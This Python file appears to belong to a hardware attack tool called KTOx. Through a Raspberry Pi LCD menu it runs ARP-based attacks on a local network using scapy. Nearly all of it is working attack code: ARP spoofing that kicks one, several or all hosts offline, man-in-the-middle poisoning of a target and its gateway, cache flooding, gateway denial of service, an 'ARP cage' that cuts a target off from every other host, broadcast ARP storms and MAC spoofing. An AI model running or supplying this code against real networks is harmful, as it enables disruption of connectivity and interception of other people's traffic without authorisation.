#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# hw/ktox_hw_attack.py — KTOx ARP Attack Engine (Hardware GUI)
#
# Covers every ARP-based offensive mode from ktox.py:
#   Kick ONE / SOME / ALL · ARP MITM · ARP Flood · Gratuitous ARP
#   Gateway DoS · ARP Cage · ARP Storm · MAC Spoof
#
# RaspyJack pattern:
#   · Standalone process  · GPIO.cleanup() guaranteed
#   · All operations in daemon threads · Live LCD counter
#   · Loot saved to ktox_loot/

import sys, os, time, signal, threading, random, subprocess

_HW_DIR  = os.path.dirname(os.path.abspath(__file__))
_ROOT    = os.path.dirname(_HW_DIR)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from ktox_hw_utils import (
    hw_init, hw_cleanup, push,
    clear_buf, draw_header, draw_status, draw_menu, draw_centered,
    draw_running, draw_result,
    read_btn, wait_for_btn,
    scan_and_pick, get_iface_and_gateway, get_network_cidr, resolve_mac,
    install_signal_handlers, make_logger, loot_dir,
    C, FONT_TITLE, FONT_MENU, FONT_SMALL, LCD_W, LCD_H,
)

try:
    from scapy.all import Ether, ARP, sendp
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    _SCAPY = True
except ImportError:
    _SCAPY = False

log = make_logger("attack")

# ─── Globals ──────────────────────────────────────────────────────────────────
LCD = IMAGE = DRAW = None
RUNNING = True

# ─── Menu entries ─────────────────────────────────────────────────────────────
MENU_ITEMS = [
    "KICK ONE",
    "KICK SOME",
    "KICK ALL",
    "ARP MITM",
    "ARP FLOOD",
    "GRAT ARP",
    "GATEWAY DoS",
    "ARP CAGE",
    "ARP STORM",
    "MAC SPOOF",
    "< BACK",
]
MENU_COLORS = [
    C["BLOOD"], C["BLOOD"], C["BLOOD"],
    C["EMBER"],
    C["BLOOD"], C["ORANGE"], C["BLOOD"], C["BLOOD"], C["BLOOD"],
    C["STEEL"],
    C["DIM"],
]


# ─── Cleanup ──────────────────────────────────────────────────────────────────
def cleanup(*_):
    global RUNNING
    if not RUNNING:
        return
    RUNNING = False
    hw_cleanup(LCD)
    sys.exit(0)


# ══════════════════════════════════════════════════════════════════════════════
# ── COMMON ARP HELPERS ────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def _arp_pkt(dst_mac, pdst, hdst, psrc, hsrc):
    return Ether(dst=dst_mac) / ARP(
        op=2, pdst=pdst, hwdst=hdst, psrc=psrc, hwsrc=hsrc
    )

def _rearp(target_ip, target_mac, gw_ip, gw_mac, iface, cycles=10):
    """Restore both ARP tables after an attack."""
    for _ in range(cycles):
        try:
            sendp(_arp_pkt(target_mac, target_ip, target_mac, gw_ip, gw_mac),
                  iface=iface, verbose=False)
            sendp(_arp_pkt(gw_mac, gw_ip, gw_mac, target_ip, target_mac),
                  iface=iface, verbose=False)
        except Exception:
            pass
        time.sleep(0.2)


# ══════════════════════════════════════════════════════════════════════════════
# ── PICK ONE / MULTI HOST ─────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def _pick_host(iface, network, gw_ip, title="TARGET"):
    return scan_and_pick(LCD, IMAGE, DRAW, iface, network,
                         title=title, allow_gw=False, gateway_ip=gw_ip)


def _pick_multi(iface, network, gw_ip):
    """Let user toggle multiple targets. Returns list of host entries."""
    clear_buf(DRAW)
    draw_header(DRAW, "SCAN...", color=C["BLOOD"])
    draw_centered(DRAW, "scanning network", 50, FONT_MENU, fill=C["STEEL"])
    push(LCD, IMAGE)

    from ktox_hw_utils import do_scan_hw
    hosts = do_scan_hw(network)
    if not hosts:
        return []
    hosts = [h for h in hosts if h[0] != gw_ip]
    if not hosts:
        return []

    selected = [False] * len(hosts)
    sel = 0
    last_t = 0.0

    while True:
        clear_buf(DRAW)
        draw_header(DRAW, "PICK TARGETS", color=C["BLOOD"])
        labels = []
        colors = []
        for i, h in enumerate(hosts):
            mark   = "[X]" if selected[i] else "[ ]"
            labels.append(f"{mark} {h[0]}")
            colors.append(C["EMBER"] if selected[i] else C["WHITE"])
        draw_menu(DRAW, labels, sel, item_colors=colors)
        n_sel = sum(selected)
        draw_status(DRAW, f"OK:TOGGLE  KEY1:{n_sel}DONE", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(hosts)
        elif btn == "DOWN":
            sel = (sel + 1) % len(hosts)
        elif btn in ("OK", "KEY_PRESS"):
            selected[sel] = not selected[sel]
        elif btn == "KEY1":          # confirm selection
            break
        elif btn in ("KEY3", "LEFT"):
            return []
        time.sleep(0.05)

    return [hosts[i] for i in range(len(hosts)) if selected[i]]


# ══════════════════════════════════════════════════════════════════════════════
# ── ATTACK OPERATIONS ─────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def op_kick(iface, iface_mac, gw_ip, gw_mac, targets, label="KICK"):
    """
    ARP-spoof one or more targets (gateway-only direction = disconnect).
    targets = list of (ip, mac)
    """
    stop  = threading.Event()
    pkts  = [0]
    ppm   = 20
    delay = 60.0 / ppm

    def _loop():
        while not stop.is_set():
            for tip, tmac in targets:
                if not tmac:
                    continue
                try:
                    sendp(_arp_pkt(tmac, tip, tmac, gw_ip, iface_mac),
                          iface=iface, verbose=False)
                    pkts[0] += 1
                except Exception as e:
                    log(f"sendp error: {e}")
            time.sleep(delay)
        log(f"KICK_END pkts={pkts[0]}")

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    from ktox_hw_utils import run_with_indicator
    subtitle = targets[0][0] if len(targets) == 1 else f"{len(targets)} hosts"
    run_with_indicator(LCD, IMAGE, DRAW, label, t, stop, pkts, subtitle=subtitle)
    stop.set()
    t.join(timeout=3)

    # Restore
    clear_buf(DRAW)
    draw_header(DRAW, "RESTORING", color=C["ORANGE"])
    draw_centered(DRAW, "re-arping...", 50, FONT_MENU, fill=C["STEEL"])
    push(LCD, IMAGE)
    for tip, tmac in targets:
        if tmac:
            _rearp(tip, tmac, gw_ip, gw_mac, iface)

    draw_result(DRAW, "DONE", [f"Pkts: {pkts[0]}", "ARP restored", "OK"], color=C["GOOD"])
    push(LCD, IMAGE)
    log(f"KICK_REARP_DONE targets={[t[0] for t in targets]}")
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_mitm(iface, iface_mac, gw_ip, gw_mac, target_ip, target_mac):
    """Bidirectional ARP MITM — poisons both target and gateway."""
    stop = threading.Event()
    pkts = [0]
    ppm  = 20
    delay = 60.0 / ppm

    def _loop():
        while not stop.is_set():
            try:
                sendp(_arp_pkt(target_mac, target_ip, target_mac, gw_ip, iface_mac),
                      iface=iface, verbose=False)
                sendp(_arp_pkt(gw_mac, gw_ip, gw_mac, target_ip, iface_mac),
                      iface=iface, verbose=False)
                pkts[0] += 2
            except Exception as e:
                log(f"MITM sendp error: {e}")
            time.sleep(delay)
        log(f"MITM_END pkts={pkts[0]}")

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    from ktox_hw_utils import run_with_indicator
    run_with_indicator(LCD, IMAGE, DRAW, "ARP MITM", t, stop, pkts,
                       subtitle=target_ip)
    stop.set()
    t.join(timeout=3)

    clear_buf(DRAW)
    draw_header(DRAW, "RESTORING", color=C["ORANGE"])
    draw_centered(DRAW, "re-arping...", 50, FONT_MENU, fill=C["STEEL"])
    push(LCD, IMAGE)
    _rearp(target_ip, target_mac, gw_ip, gw_mac, iface)

    draw_result(DRAW, "MITM DONE", [f"Pkts: {pkts[0]}", target_ip, "ARP restored"], color=C["GOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_flood(iface, iface_mac, target_ip, target_mac):
    """Flood target with random ARP replies (ARP cache saturation)."""
    stop = threading.Event()
    pkts = [0]

    def _loop():
        while not stop.is_set():
            fake_ip  = ".".join(str(random.randint(1, 254)) for _ in range(4))
            fake_mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
            try:
                sendp(_arp_pkt(target_mac, target_ip, target_mac,
                               fake_ip, fake_mac),
                      iface=iface, verbose=False)
                pkts[0] += 1
            except Exception as e:
                log(f"FLOOD sendp error: {e}")
        log(f"FLOOD_END pkts={pkts[0]}")

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    from ktox_hw_utils import run_with_indicator
    run_with_indicator(LCD, IMAGE, DRAW, "ARP FLOOD", t, stop, pkts,
                       subtitle=target_ip)
    stop.set()
    t.join(timeout=3)

    draw_result(DRAW, "FLOOD DONE", [f"Pkts: {pkts[0]}", target_ip], color=C["GOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_gratuitous(iface, iface_mac, claim_ip):
    """Broadcast unsolicited ARP claiming an IP."""
    stop = threading.Event()
    pkts = [0]
    delay = 1.0

    def _loop():
        while not stop.is_set():
            try:
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, pdst=claim_ip, hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=claim_ip, hwsrc=iface_mac
                ), iface=iface, verbose=False)
                pkts[0] += 1
            except Exception as e:
                log(f"GRAT sendp error: {e}")
            time.sleep(delay)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    from ktox_hw_utils import run_with_indicator
    run_with_indicator(LCD, IMAGE, DRAW, "GRAT ARP", t, stop, pkts,
                       subtitle=claim_ip)
    stop.set()
    t.join(timeout=3)

    draw_result(DRAW, "GRAT DONE", [f"Claimed: {claim_ip}", f"Pkts: {pkts[0]}"], color=C["GOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_gateway_dos(iface, iface_mac, gw_ip, gw_mac, hosts):
    """Poison all hosts + gateway simultaneously (gateway DoS)."""
    stop = threading.Event()
    pkts = [0]
    delay = 0.05

    def _loop():
        while not stop.is_set():
            for h in hosts:
                tip, tmac = h[0], h[1]
                if not tmac:
                    continue
                try:
                    # Tell target: we are the gateway
                    sendp(_arp_pkt(tmac, tip, tmac, gw_ip, iface_mac),
                          iface=iface, verbose=False)
                    pkts[0] += 1
                except Exception:
                    pass
            time.sleep(delay)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    from ktox_hw_utils import run_with_indicator
    run_with_indicator(LCD, IMAGE, DRAW, "GW DoS", t, stop, pkts,
                       subtitle=f"{len(hosts)} hosts")
    stop.set()
    t.join(timeout=3)

    # Re-ARP all
    clear_buf(DRAW)
    draw_header(DRAW, "RESTORING", color=C["ORANGE"])
    draw_centered(DRAW, "re-arping all...", 50, FONT_MENU, fill=C["STEEL"])
    push(LCD, IMAGE)
    for h in hosts:
        tip, tmac = h[0], h[1]
        if tmac:
            _rearp(tip, tmac, gw_ip, gw_mac, iface, cycles=5)

    draw_result(DRAW, "GW DoS DONE", [f"Pkts: {pkts[0]}", "ARP restored"], color=C["GOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_arp_cage(iface, iface_mac, gw_ip, gw_mac, target_ip, target_mac):
    """
    Complete network isolation: poison target AND all other reachable hosts
    so nobody can talk to the target.
    """
    stop = threading.Event()
    pkts = [0]
    delay = 0.3

    # Quick gather of all known hosts (use ARP cache)
    other_hosts = []
    try:
        out = subprocess.check_output(["arp", "-an"], text=True, timeout=3)
        for line in out.splitlines():
            parts = line.split()
            try:
                ip  = parts[1].strip("()")
                mac = parts[3]
                if ip != target_ip and ip != gw_ip and mac and ":" in mac:
                    other_hosts.append((ip, mac))
            except IndexError:
                pass
    except Exception:
        pass

    def _loop():
        while not stop.is_set():
            try:
                # Cage the target from the gateway
                sendp(_arp_pkt(target_mac, target_ip, target_mac, gw_ip, iface_mac),
                      iface=iface, verbose=False)
                sendp(_arp_pkt(gw_mac, gw_ip, gw_mac, target_ip, iface_mac),
                      iface=iface, verbose=False)
                pkts[0] += 2
                # Cage target from every other host
                for oip, omac in other_hosts:
                    sendp(_arp_pkt(target_mac, target_ip, target_mac, oip, iface_mac),
                          iface=iface, verbose=False)
                    sendp(_arp_pkt(omac, oip, omac, target_ip, iface_mac),
                          iface=iface, verbose=False)
                    pkts[0] += 2
            except Exception as e:
                log(f"CAGE error: {e}")
            time.sleep(delay)

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    from ktox_hw_utils import run_with_indicator
    run_with_indicator(LCD, IMAGE, DRAW, "ARP CAGE", t, stop, pkts,
                       subtitle=target_ip)
    stop.set()
    t.join(timeout=3)

    clear_buf(DRAW)
    draw_header(DRAW, "RESTORING", color=C["ORANGE"])
    draw_centered(DRAW, "re-arping...", 50, FONT_MENU, fill=C["STEEL"])
    push(LCD, IMAGE)
    _rearp(target_ip, target_mac, gw_ip, gw_mac, iface)

    draw_result(DRAW, "CAGE DONE", [f"Pkts: {pkts[0]}", target_ip, "Released"], color=C["GOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_arp_storm(iface, iface_mac):
    """Broadcast ARP reply storm — random src/dst pairs to all hosts."""
    stop = threading.Event()
    pkts = [0]

    def _loop():
        while not stop.is_set():
            fake_src = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
            fake_ip  = ".".join(str(random.randint(1,254)) for _ in range(4))
            try:
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2,
                    pdst="255.255.255.255",
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=fake_ip,
                    hwsrc=fake_src,
                ), iface=iface, verbose=False)
                pkts[0] += 1
            except Exception as e:
                log(f"STORM error: {e}")

    t = threading.Thread(target=_loop, daemon=True)
    t.start()

    from ktox_hw_utils import run_with_indicator
    run_with_indicator(LCD, IMAGE, DRAW, "ARP STORM", t, stop, pkts,
                       subtitle="broadcast")
    stop.set()
    t.join(timeout=3)

    draw_result(DRAW, "STORM DONE", [f"Pkts: {pkts[0]}", "broadcast"], color=C["GOOD"])
    push(LCD, IMAGE)
    wait_for_btn(["KEY3", "LEFT", "OK"])


def op_mac_spoof(iface):
    """Rotate this interface's MAC to a random locally-administered address."""
    new_mac = f"02:{':'.join(f'{random.randint(0,255):02x}' for _ in range(5))}"
    clear_buf(DRAW)
    draw_header(DRAW, "MAC SPOOF", color=C["STEEL"])
    draw_centered(DRAW, "New MAC:", 35, FONT_SMALL, fill=C["STEEL"])
    draw_centered(DRAW, new_mac, 48, FONT_SMALL, fill=C["YELLOW"])
    draw_status(DRAW, "OK:APPLY  KEY3:SKIP", color=C["DIM"])
    push(LCD, IMAGE)

    btn = wait_for_btn(["OK", "KEY_PRESS", "KEY3", "LEFT"])
    if btn not in ("OK", "KEY_PRESS"):
        return

    ok = True
    try:
        subprocess.run(["ip", "link", "set", iface, "down"],  check=True, timeout=5)
        subprocess.run(["ip", "link", "set", iface, "address", new_mac],
                       check=True, timeout=5)
        subprocess.run(["ip", "link", "set", iface, "up"],    check=True, timeout=5)
    except Exception as e:
        ok = False
        log(f"MAC_SPOOF error: {e}")

    color = C["GOOD"] if ok else C["BLOOD"]
    msg   = "Applied!" if ok else "FAILED"
    draw_result(DRAW, "MAC SPOOF", [new_mac, msg], color=color)
    push(LCD, IMAGE)
    log(f"MAC_SPOOF iface={iface} new={new_mac} ok={ok}")
    wait_for_btn(["KEY3", "LEFT", "OK"])


# ══════════════════════════════════════════════════════════════════════════════
# ── INPUT HELPER: enter an IP via on-screen prompt ───────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def _ip_from_scan(iface, network, gw_ip):
    """Scan and return a chosen IP string (or None)."""
    host = scan_and_pick(LCD, IMAGE, DRAW, iface, network,
                         title="SELECT HOST", allow_gw=True, gateway_ip=None)
    return host[0] if host else None


# ══════════════════════════════════════════════════════════════════════════════
# ── MAIN ──────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

def main():
    global LCD, IMAGE, DRAW

    if not _SCAPY:
        clear_buf(DRAW)
        draw_header(DRAW, "ATTACK", color=C["BLOOD"])
        draw_centered(DRAW, "scapy not found", 50, FONT_MENU, fill=C["ORANGE"])
        push(LCD, IMAGE)
        time.sleep(3)
        return

    iface, iface_mac, gw_ip = get_iface_and_gateway()
    if not iface:
        clear_buf(DRAW)
        draw_header(DRAW, "ATTACK", color=C["BLOOD"])
        draw_centered(DRAW, "no interface!", 50, FONT_MENU, fill=C["BLOOD"])
        push(LCD, IMAGE)
        wait_for_btn(["KEY3"])
        return

    network = get_network_cidr(iface)
    gw_mac  = resolve_mac(gw_ip) if gw_ip else None

    sel    = 0
    last_t = 0.0

    while RUNNING:
        clear_buf(DRAW)
        draw_header(DRAW, "ATTACK", color=C["BLOOD"])
        draw_menu(DRAW, MENU_ITEMS, sel, item_colors=MENU_COLORS)
        draw_status(DRAW, "OK:RUN  KEY3:BACK", color=C["DIM"])
        push(LCD, IMAGE)

        btn, last_t = read_btn(last_t)
        if btn == "UP":
            sel = (sel - 1) % len(MENU_ITEMS)
        elif btn == "DOWN":
            sel = (sel + 1) % len(MENU_ITEMS)
        elif btn in ("OK", "KEY_PRESS", "RIGHT"):
            choice = MENU_ITEMS[sel]

            if choice == "KICK ONE":
                host = _pick_host(iface, network, gw_ip)
                if host:
                    tmac = host[1] or resolve_mac(host[0])
                    if tmac:
                        op_kick(iface, iface_mac, gw_ip, gw_mac,
                                [(host[0], tmac)], "KICK ONE")
                    else:
                        draw_result(DRAW, "ERR", ["MAC not found"], color=C["BLOOD"])
                        push(LCD, IMAGE)
                        wait_for_btn(["KEY3", "LEFT"])

            elif choice == "KICK SOME":
                targets = _pick_multi(iface, network, gw_ip)
                if targets:
                    pairs = [(h[0], h[1] or resolve_mac(h[0])) for h in targets]
                    pairs = [(ip, mac) for ip, mac in pairs if mac]
                    if pairs:
                        op_kick(iface, iface_mac, gw_ip, gw_mac,
                                pairs, "KICK SOME")

            elif choice == "KICK ALL":
                from ktox_hw_utils import do_scan_hw
                clear_buf(DRAW)
                draw_header(DRAW, "KICK ALL", color=C["BLOOD"])
                draw_centered(DRAW, "scanning...", 50, FONT_MENU, fill=C["STEEL"])
                push(LCD, IMAGE)
                hosts = do_scan_hw(network)
                hosts = [h for h in hosts if h[0] != gw_ip]
                if hosts:
                    pairs = [(h[0], h[1] or resolve_mac(h[0])) for h in hosts]
                    pairs = [(ip, mac) for ip, mac in pairs if mac]
                    if pairs:
                        op_kick(iface, iface_mac, gw_ip, gw_mac,
                                pairs, "KICK ALL")

            elif choice == "ARP MITM":
                host = _pick_host(iface, network, gw_ip, title="MITM TARGET")
                if host and gw_mac:
                    tmac = host[1] or resolve_mac(host[0])
                    if tmac:
                        op_mitm(iface, iface_mac, gw_ip, gw_mac,
                                host[0], tmac)

            elif choice == "ARP FLOOD":
                host = _pick_host(iface, network, gw_ip, title="FLOOD TARGET")
                if host:
                    tmac = host[1] or resolve_mac(host[0])
                    if tmac:
                        op_flood(iface, iface_mac, host[0], tmac)

            elif choice == "GRAT ARP":
                host = _ip_from_scan(iface, network, gw_ip)
                if host:
                    op_gratuitous(iface, iface_mac, host)

            elif choice == "GATEWAY DoS":
                from ktox_hw_utils import do_scan_hw
                clear_buf(DRAW)
                draw_header(DRAW, "GW DoS", color=C["BLOOD"])
                draw_centered(DRAW, "scanning...", 50, FONT_MENU, fill=C["STEEL"])
                push(LCD, IMAGE)
                all_hosts = do_scan_hw(network)
                targets   = [h for h in all_hosts if h[0] != gw_ip and h[1]]
                if targets and gw_mac:
                    op_gateway_dos(iface, iface_mac, gw_ip, gw_mac, targets)

            elif choice == "ARP CAGE":
                host = _pick_host(iface, network, gw_ip, title="CAGE TARGET")
                if host and gw_mac:
                    tmac = host[1] or resolve_mac(host[0])
                    if tmac:
                        op_arp_cage(iface, iface_mac, gw_ip, gw_mac,
                                    host[0], tmac)

            elif choice == "ARP STORM":
                op_arp_storm(iface, iface_mac)

            elif choice == "MAC SPOOF":
                op_mac_spoof(iface)

            elif choice == "< BACK":
                break

        elif btn == "KEY3":
            break
        time.sleep(0.05)


if __name__ == "__main__":
    install_signal_handlers(cleanup)
    try:
        LCD, IMAGE, DRAW = hw_init()
        main()
    finally:
        cleanup()
